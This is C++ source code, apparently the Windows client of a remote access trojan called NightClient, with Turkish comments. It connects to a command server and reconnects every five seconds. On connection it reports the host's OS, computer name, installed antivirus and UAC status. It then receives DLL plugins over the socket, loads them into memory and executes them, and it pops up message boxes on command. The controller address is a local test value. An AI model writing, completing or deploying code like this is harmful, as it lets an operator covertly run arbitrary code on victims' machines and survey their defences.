#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <algorithm>
#include <cstdint>
#include "../include/json.hpp"
#include "../include/SysInfo.hpp"
#include "../include/PluginManager.hpp"

#pragma comment(lib, "ws2_32.lib")

using json = nlohmann::json;
using namespace std;

#pragma pack(push, 1)
struct PacketHeader {
    uint8_t type;       // 0x01: JSON, 0x02: DLL
    char pluginId[4];   // Örn: 'INFO'
    uint32_t payloadSize;
};
#pragma pack(pop)

class NightClient {
private:
    SOCKET sock;
    PluginManager pluginMgr;
    bool connected = false;

    bool receive_bytes(char* buffer, int size) {
        int received = 0;
        while (received < size) {
            int res = recv(sock, buffer + received, size - received, 0);
            if (res <= 0) return false;
            received += res;
        }
        return true;
    }

    // Veri gönderme: Binary Protokol (Type 0x01: JSON)
    void send_data(json data) {
        if (!connected) return;
        string msg = data.dump();

        PacketHeader header;
        header.type = 0x01;
        memset(header.pluginId, 0, 4);
        header.payloadSize = (uint32_t)msg.length();

        send(sock, (char*)&header, sizeof(header), 0);
        send(sock, msg.c_str(), (int)msg.length(), 0);
    }

    void send_initial_info() {
        time_t now = time(0);
        char date_buf[20];
        strftime(date_buf, sizeof(date_buf), "%Y-%m-%d %H:%M:%S", localtime(&now));

        json info = {
            {"action",    "initial_info"},
            {"ip",        "127.0.0.1"},
            {"os",        SysInfo::getOS()},
            {"country",   "Turkey"},
            {"desktop",   SysInfo::getPCName()},
            {"antivirus", SysInfo::getAntivirus()},
            {"uac",       "Enabled"},
            {"date",      string(date_buf)}
        };
        send_data(info);
    }

    void handle_server_messages() {
        while (connected) {
            PacketHeader header;
            if (!receive_bytes((char*)&header, sizeof(header))) break;

            vector<unsigned char> payload(header.payloadSize);
            if (header.payloadSize > 0) {
                if (!receive_bytes((char*)payload.data(), header.payloadSize)) break;
            }

            if (header.type == 0x01) { // JSON Command
                try {
                    string raw_msg((char*)payload.data(), payload.size());
                    auto data = json::parse(raw_msg);
                    string action = data.value("action", "");

                    if (action == "getinfo") {
                        if (!pluginMgr.isPluginLoaded("INFO")) {
                            cout << "[*] INFO plugini yuklu degil, diskten okunuyor (Test)..." << endl;
                            ifstream file("information.dll", ios::binary | ios::ate);
                            if (file.is_open()) {
                                streamsize size = file.tellg();
                                file.seekg(0, ios::beg);
                                vector<unsigned char> buffer(size);
                                if (file.read((char*)buffer.data(), (streamsize)size)) {
                                    pluginMgr.loadPluginFromMemory("INFO", buffer);
                                }
                                file.close();
                            } else {
                                cout << "[-] information.dll bulunamadi, yerlesik SysInfo kullaniliyor." << endl;
                                send_data(SysInfo::getAllInfo());
                                continue;
                            }
                        }

                        if (pluginMgr.isPluginLoaded("INFO")) {
                            pluginMgr.executePlugin("INFO", "RunPlugin", sock);
                        }
                    }
                    else if (action == "message" || action == "messagebox") {
                        string title = data.value("title", "Sistem Mesaji");
                        string text  = data.value("text", "");
                        thread([title, text]() {
                            MessageBoxA(NULL, text.c_str(), title.c_str(), MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
                        }).detach();
                    }
                    else if (action == "ping") {
                        send_data({{"action", "pong"}});
                    }
                } catch (...) {}
            }
            else if (header.type == 0x02) { // Binary DLL
                string pId(header.pluginId, 4);
                // null terminator temizle
                pId.erase(remove(pId.begin(), pId.end(), '\0'), pId.end());
                cout << "[+] DLL paketi alindi: " << pId << " Size: " << header.payloadSize << endl;
                pluginMgr.loadPluginFromMemory(pId, payload);
            }
        }
        connected = false;
    }

public:
    void start(const char* ip, int port) {
        while (true) {
            WSADATA wsa;
            if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
                this_thread::sleep_for(chrono::seconds(5));
                continue;
            }
            sock = socket(AF_INET, SOCK_STREAM, 0);

            sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            inet_pton(AF_INET, ip, &addr.sin_addr);

            cout << "[...] Baglaniliyor: " << ip << ":" << port << endl;

            if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
                cout << "[+] Baglanti basarili!" << endl;
                connected = true;

                send_initial_info();
                handle_server_messages();
            }

            closesocket(sock);
            WSACleanup();
            this_thread::sleep_for(chrono::seconds(5));
        }
    }
};

int main() {
    NightClient client;
    client.start("127.0.0.1", 1337);
    return 0;
}
